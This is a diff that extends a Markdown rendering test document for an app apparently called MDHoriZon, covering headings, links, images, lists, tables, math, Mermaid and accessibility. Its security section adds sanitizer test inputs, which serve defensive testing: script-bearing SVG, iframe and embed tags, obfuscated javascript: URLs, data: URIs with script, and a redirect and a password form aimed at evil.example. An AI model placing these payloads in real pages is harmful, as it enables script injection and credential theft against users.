@@ -18,6 +18,28 @@ It is intentionally broad. It is not intended to be beautiful content; it is int
 
 ###### Heading level 6
 
+ATX headings may also be closed:
+
+## Closed heading with trailing hashes ##
+
+Setext headings use an underline instead of a leading hash:
+
+Heading level 1 (setext)
+========================
+
+Heading level 2 (setext)
+------------------------
+
+Inline markup inside a heading must render without breaking the heading itself:
+
+## Heading with **bold**, *italic* and `code`
+
+Duplicate headings must receive deterministic and distinct anchor IDs, so that links to either one remain stable:
+
+## Duplicate heading
+
+## Duplicate heading
+
 ---
 
 # 2. Paragraphs and Inline Formatting
@@ -37,25 +59,93 @@ Here is `inline code`, an escaped character \*that should not become italic\*, a
 - Anchor link: [Go to Mermaid](#12-mermaid)
 - Email-style text: `example@example.com`
 
+GFM autolinks — bare URLs, `www.` hosts and angle-bracketed URLs must all become links:
+
+- Bare URL: https://example.com/path?query=1#fragment
+- Bare www host: www.example.com
+- Angle-bracketed URL: <https://example.com/>
+- Angle-bracketed e-mail: <example@example.com>
+
+Reference-style links, with the definition placed later in this document:
+
+- Full reference: [MDHoriZon repository][repo-ref]
+- Collapsed reference: [repo-ref][]
+- Shortcut reference: [repo-ref]
+
+A link with a title attribute (the title must survive into the rendered `title`):
+
+[GitHub with title](https://github.com/ "GitHub home page")
+
+Line breaks. The two lines below are separated by a soft line break; the second pair is separated by two
+trailing spaces, which must produce a hard line break.
+
+Soft
+break
+
+Hard  
+break
+
+A backslash at the end of a line must also produce a hard line break:\
+this text starts on a new line.
+
+[repo-ref]: https://github.com/wachin/MDHoriZon "MDHoriZon on GitHub"
+
 ---
 
 # 4. Images
 
-Remote image example:
+Remote image example. This requires network access; with no network it must fail exactly as gracefully as the
+missing-image case below:
 
 ![MDHoriZon placeholder image](https://placehold.co/640x240/0b3d91/ffffff/png?text=MDHoriZon)
 
-Relative image example:
+Relative image example. The file exists at `tests/assets/example.png` and must resolve relative to this
+document, not relative to the application or the page URL:
 
 ![Relative image](../assets/example.png)
 
-Missing image example:
+Redundant `./` and `..` segments must be normalized rather than treated as a literal path:
+
+![Relative image with redundant segments](./../assets/example.png)
+
+Image with a title attribute (the title must survive into the rendered `title`):
+
+![Relative image with title](../assets/example.png "The relative fixture asset")
+
+Decorative image with intentionally empty alt text. It must not be announced by assistive technology and must
+not produce a broken-image placeholder:
+
+![](../assets/example.png)
+
+Very wide image. It must stay inside the viewport, keep its aspect ratio, and scroll or shrink instead of
+stretching the layout:
+
+![Wide fixture asset](../assets/wide.png)
+
+Very tall image. It must not force the page to become unusable without scrolling:
+
+![Tall fixture asset](../assets/tall.png)
+
+Missing image example. `tests/assets/does-not-exist.png` **intentionally does not exist**; this is a negative
+test, not an unfinished task, and creating that file would delete this test case. Expected behavior: the
+article keeps rendering, the alt text stays available, and nothing throws.
 
 ![This image intentionally does not exist](../assets/does-not-exist.png)
 
 Image used as a link:
 
 [![Linked image](https://placehold.co/320x120/1e88e5/ffffff/png?text=Link)](https://github.com/)
+
+Image inside a list item:
+
+- List item with an image: ![Inline icon](../assets/example.png)
+- Item after the image.
+
+Image inside a table cell:
+
+| Placement | Image |
+|---|---|
+| Table cell | ![Icon in a table](../assets/example.png) |
 
 ---
 
@@ -83,6 +173,48 @@ Image used as a link:
 - [x] Completed item
 - [ ] Pending item
 - [ ] Another pending item
+
+## Loose list (blank lines between items)
+
+- First item, separated from the next by a blank line.
+
+- Second item.
+
+- Third item.
+
+## List item containing multiple paragraphs
+
+1. First paragraph of the item.
+
+   Second paragraph of the same item, which must stay inside the item rather than escaping into the document.
+
+2. Next item.
+
+## Ordered list starting at a number other than 1
+
+5. Fifth
+6. Sixth
+7. Seventh
+
+The rendered list must preserve the starting number rather than silently renumbering from 1.
+
+## List item containing a fenced code block
+
+- Item with code:
+
+  ```bash
+  echo "code inside a list item"
+  ```
+
+- Item after the code block.
+
+## Mixed nested list
+
+- Unordered item
+  1. Ordered child
+     - Unordered grandchild
+  2. Second ordered child
+- Final unordered item
 
 ---
 
@@ -183,6 +315,34 @@ This must still render as readable code.
 This is intentionally an extremely long line intended to verify horizontal scrolling rather than forcing the entire document or viewport to become unnecessarily wide on desktop or mobile devices.
 ```
 
+## Unbroken long token
+
+```text
+https://example.com/a/deliberately/long/unbroken/path/that/cannot/wrap/at/all/and/must/instead/scroll/horizontally/without/stretching/the/viewport/0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789
+```
+
+## Plain text block with no language declared
+
+```
+No language is declared for this fence, and it must still render as a readable code block.
+```
+
+## Empty code block
+
+```text
+```
+
+## Indented code block (four spaces, no fence)
+
+    indented code block, first line
+    indented code block, second line
+
+## Language alias and uppercase identifier
+
+```JS
+console.log("Alias and uppercase language identifiers must not crash the highlighter")
+```
+
 ---
 
 # 8. Tables
@@ -220,6 +380,50 @@ This is intentionally an extremely long line intended to verify horizontal scrol
 | Link | [GitHub](https://github.com/) |
 | Long text | This is a deliberately long cell that should remain readable without breaking the table layout. |
 
+## Alignment variants
+
+| Left | Center | Right | Default |
+|:---|:---:|---:|---|
+| l | c | r | d |
+| a longer cell | a longer cell | a longer cell | a longer cell |
+
+## Table without leading or trailing pipes
+
+Name | Value
+--- | ---
+Alpha | 1
+Beta | 2
+
+## Escaped pipe and pipe inside inline code
+
+| Case | Rendered as |
+|---|---|
+| Escaped pipe | a \| b |
+| Pipe inside inline code (escaped for the table) | `a \| b` |
+| Pipe escaped inside a link label | [a \| b](https://github.com/) |
+
+## Empty cells
+
+| A | B | C |
+|---|---|---|
+| 1 |  | 3 |
+|  | 2 |  |
+
+## Mathematical expressions inside cells (where supported)
+
+| Formula | Meaning |
+|---|---|
+| $E = mc^2$ | mass-energy equivalence |
+| $\frac{a}{b}$ | fraction |
+| $\sum_{i=1}^{n} i$ | sum |
+
+## Wide table — 20 columns
+
+| C1 | C2 | C3 | C4 | C5 | C6 | C7 | C8 | C9 | C10 | C11 | C12 | C13 | C14 | C15 | C16 | C17 | C18 | C19 | C20 |
+|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|
+| A1 | A2 | A3 | A4 | A5 | A6 | A7 | A8 | A9 | A10 | A11 | A12 | A13 | A14 | A15 | A16 | A17 | A18 | A19 | A20 |
+| B1 | B2 | B3 | B4 | B5 | B6 | B7 | B8 | B9 | B10 | B11 | B12 | B13 | B14 | B15 | B16 | B17 | B18 | B19 | B20 |
+
 ---
 
 # 9. Horizontal Rule
@@ -247,6 +451,20 @@ HTML entities:
 `&amp;` &amp;  
 `&lt;` &lt;  
 `&gt;` &gt;
+
+## Unicode, bidirectional text and emoji
+
+Accented Latin: á é í ó ú ñ ü ç ß Å Æ Ø å æ ø
+
+CJK: 日本語のテキスト、中文文本、한국어 텍스트
+
+Right-to-left: العربية and עברית must render with correct direction, including when they contain punctuation.
+
+Mixed direction on one line: English text, العربية text, more English text.
+
+Emoji: 😀 🚀 🧪 🇦🇷 👩‍💻 — the last one is a zero-width-joiner sequence and must not be split apart.
+
+Mathematical and typographic symbols: ∀x ∈ ℝ, ∑ ± × ÷ ≤ ≥ ≠ ∞ → ⇒ ⌘ € £ ¥ © ® ™ …
 
 ---
 
@@ -303,6 +521,59 @@ $$
 = 0
 $$
 
+## Superscripts, subscripts and Greek letters
+
+Inline: $x^2 + y_1$, $a_{n+1}$, $\alpha$, $\beta$, $\gamma$, $\Delta$, $\Omega$, $\theta$.
+
+## Text inside math
+
+$$
+\text{rate} = \frac{\Delta x}{\Delta t}
+$$
+
+## Aligned expressions
+
+$$
+\begin{aligned}
+a &= b + c \\
+  &= d + e
+\end{aligned}
+$$
+
+## Formulas inside lists
+
+- Inline math in a list item: $E = mc^2$.
+- Display math inside a list item:
+
+  $$
+  \sum_{i=1}^{n} i = \frac{n(n+1)}{2}
+  $$
+
+- Item after the math.
+
+## Formulas inside blockquotes
+
+> Inline math inside a blockquote: $a^2 + b^2 = c^2$.
+>
+> Display math inside a blockquote:
+>
+> $$
+> \int_0^1 x\,dx = \frac{1}{2}
+> $$
+
+Formulas inside table cells are covered in section 8.
+
+## Missing and invalid math must degrade gracefully
+
+An unterminated delimiter must stay literal instead of swallowing the rest of the paragraph: $E = mc^2
+
+An unknown command must produce an error (or a literal fallback) without crashing the article:
+$\thisCommandDoesNotExist{x}$
+
+Currency must not be mistaken for mathematics: the item costs $5 and the other costs $10 today.
+
+An escaped dollar renders as a literal dollar sign: \$100.
+
 ---
 
 # 12. Mermaid
@@ -353,6 +624,40 @@ classDiagram
     MarkdownDocument --> OfflineLibrary
 ```
 
+## State diagram
+
+```mermaid
+stateDiagram-v2
+    [*] --> Reading
+    Reading --> Downloading: user requests offline copy
+    Downloading --> AvailableOffline: download complete
+    AvailableOffline --> Reading: open from local storage
+    Reading --> [*]
+```
+
+## Additional supported diagram type
+
+```mermaid
+pie title Content sources
+    "Network" : 45
+    "Bundled" : 25
+    "Offline storage" : 30
+```
+
+## Invalid diagrams must not crash the article
+
+The first block below is malformed Mermaid syntax; the second is not Mermaid at all. Both must produce visible
+error feedback (or a readable fallback) while the rest of the document keeps rendering.
+
+```mermaid
+flowchart TD
+    A[Unclosed label --> B
+```
+
+```mermaid
+this is not a valid mermaid diagram at all
+```
+
 ---
 
 # 13. Frontmatter
@@ -372,6 +677,10 @@ tags:
 ```
 
 The application must decide whether frontmatter is removed before rendering and how metadata is consumed.
+
+Frontmatter is only recognized at the very start of a file, so this golden document cannot test it directly — the
+block above documents the syntax, it is not a live frontmatter block. Real frontmatter parsing must be covered by a
+separate fixture whose first bytes are the opening delimiter.
 
 ---
 
@@ -396,6 +705,66 @@ Potentially dangerous examples must be tested by automated security fixtures rat
 ```html
 <a href="javascript:alert('unsafe')">unsafe link</a>
 ```
+
+Dangerous SVG, embedded documents and other unsafe external resources:
+
+```html
+<svg><script>alert("unsafe")</script></svg>
+```
+
+```html
+<svg onload="alert('unsafe')"><circle r="10" /></svg>
+```
+
+```html
+<iframe src="https://example.com"></iframe>
+```
+
+```html
+<object data="https://example.com"></object>
+```
+
+```html
+<embed src="https://example.com">
+```
+
+```html
+<style>body { display: none }</style>
+```
+
+```html
+<base href="https://evil.example/">
+```
+
+```html
+<meta http-equiv="refresh" content="0;url=https://evil.example/">
+```
+
+```html
+<form action="https://evil.example/"><input name="secret" type="password"></form>
+```
+
+Obfuscated unsafe URLs, which must be rejected by normalization rather than by naive string matching:
+
+```html
+<a href="JaVaScRiPt:alert('unsafe')">mixed-case javascript URL</a>
+```
+
+```html
+<a href="java&#x73;cript:alert('unsafe')">entity-encoded javascript URL</a>
+```
+
+```html
+<a href="  javascript:alert('unsafe')">javascript URL with leading whitespace</a>
+```
+
+Markdown-native unsafe URLs must also be rejected, not only the raw-HTML ones:
+
+[Markdown link to javascript:](javascript:alert('unsafe'))
+
+![Markdown image with a data URI](data:image/svg+xml,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E%3C%2Fsvg%3E)
+
+[Markdown link with a data:text/html URI](data:text/html,%3Cscript%3Ealert('unsafe')%3C%2Fscript%3E)
 
 Expected behavior is determined by the project's explicit sanitization policy.
 
@@ -455,27 +824,48 @@ The rendered result should expose:
 - Visible focus indicators.
 - Sufficient contrast.
 
+Content that exercises those requirements:
+
+- A decorative image that must be ignored by assistive technology: ![](../assets/example.png)
+- A meaningful image that must be announced: ![MDHoriZon fixture asset](../assets/example.png)
+- Collapsible content that must be keyboard operable (subject to the raw-HTML policy — if `<details>` is
+  stripped, this case documents that decision rather than failing):
+
+<details>
+<summary>Expand for the hidden sentence</summary>
+
+The hidden sentence.
+
+</details>
+
 ---
 
 # 19. Final Regression Checklist
 
-- [ ] Headings render correctly.
+- [ ] H1–H6, setext and closed ATX headings render correctly.
+- [ ] Duplicate headings receive deterministic, distinct anchors.
 - [ ] Inline formatting renders correctly.
-- [ ] Links work.
-- [ ] Images work or fail gracefully.
-- [ ] Lists render correctly.
-- [ ] Blockquotes render correctly.
-- [ ] Code blocks highlight correctly.
-- [ ] Long code lines scroll horizontally.
-- [ ] Copy button works.
+- [ ] Unicode, bidirectional text and emoji render correctly.
+- [ ] Links work, including autolinks, reference-style links and titled links.
+- [ ] Hard and soft line breaks behave as specified.
+- [ ] Images work or fail gracefully, including the deliberately missing one.
+- [ ] Decorative images expose empty alternative text and are not announced.
+- [ ] Very wide and very tall images keep their aspect ratio without breaking the layout.
+- [ ] Relative assets resolve correctly, including paths with redundant `./` and `..` segments.
+- [ ] Lists render correctly, including loose lists, multi-paragraph items and lists starting at 5.
+- [ ] Blockquotes render correctly, including nested ones.
+- [ ] Code blocks highlight correctly, including unknown languages, aliases and indented blocks.
+- [ ] Long code lines and unbroken tokens scroll horizontally.
+- [ ] Copy button works and is keyboard accessible.
 - [ ] Tables scroll horizontally on narrow screens.
-- [ ] Wide tables do not break the viewport.
-- [ ] KaTeX renders correctly.
-- [ ] Mermaid renders correctly.
-- [ ] Mermaid errors do not crash the article.
+- [ ] Wide tables (up to 20 columns) do not break the viewport.
+- [ ] Table alignment, escaped pipes, empty cells and math inside cells render correctly.
+- [ ] KaTeX renders correctly, including inside lists and blockquotes.
+- [ ] Invalid or missing math degrades gracefully without crashing the article.
+- [ ] Mermaid renders correctly, including state diagrams and additional diagram types.
+- [ ] Mermaid errors do not crash the article and produce visible feedback.
 - [ ] Themes remain readable.
-- [ ] Relative assets resolve correctly.
-- [ ] Unsafe content is sanitized according to policy.
+- [ ] Unsafe content is sanitized according to policy, including SVG, iframes, `data:` URIs and obfuscated `javascript:` URLs.
 - [ ] The complete document works offline.
 - [ ] The complete document works inside Android WebView.
 - [ ] The complete document works inside iOS WebView when available.
